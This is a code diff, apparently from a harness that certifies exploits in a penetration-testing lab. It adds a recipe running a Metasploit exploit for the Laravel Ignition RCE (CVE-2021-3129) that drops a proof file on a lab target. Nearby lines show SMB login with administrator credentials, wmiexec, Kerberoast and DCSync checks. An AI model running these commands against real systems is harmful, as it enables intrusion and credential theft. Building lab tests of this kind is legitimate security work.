@@ -811,6 +811,14 @@ wmi_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "whoami" --
 printf '%s\n' "$wmi_out"
 printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '%s' "$wmi_out" | grep -q 'Pwn3d!' && printf '%s' "$wmi_out" | grep -q 'Executed command via wmiexec' && echo __PORTAL_RECIPE_OK__"""
     ),
+    "mission_vulhub_web_exploit": CaptureRecipe(
+        # Reuses vuln_laravel_rce's own already-certified msf exploit
+        # verbatim (CVE-2021-3129, Ignition debug-mode RCE) rather than a
+        # new, untested vulhub image -- see that recipe's own entry.
+        command=r"""out=$(msfconsole -q -x "use exploit/multi/php/ignition_laravel_debug_rce; set RHOSTS $TARGET_HOST; set RPORT $TARGET_PORT; set TARGET 0; set PAYLOAD cmd/unix/generic; set CMD touch /tmp/portal-mission-laravel-proof; check; run; exit -y" 2>&1); printf '%s\n' "$out" | tail -100; printf '%s' "$out" | grep -q 'target appears to be vulnerable' && echo __PORTAL_RECIPE_OK__""",
+        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-mission-laravel-proof && echo PORTAL_TARGET_POSTCONDITION:mission-laravel-rce:/tmp/portal-mission-laravel-proof'"''',
+        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:mission-laravel-rce:/tmp/portal-mission-laravel-proof",
+    ),
 }
 
 
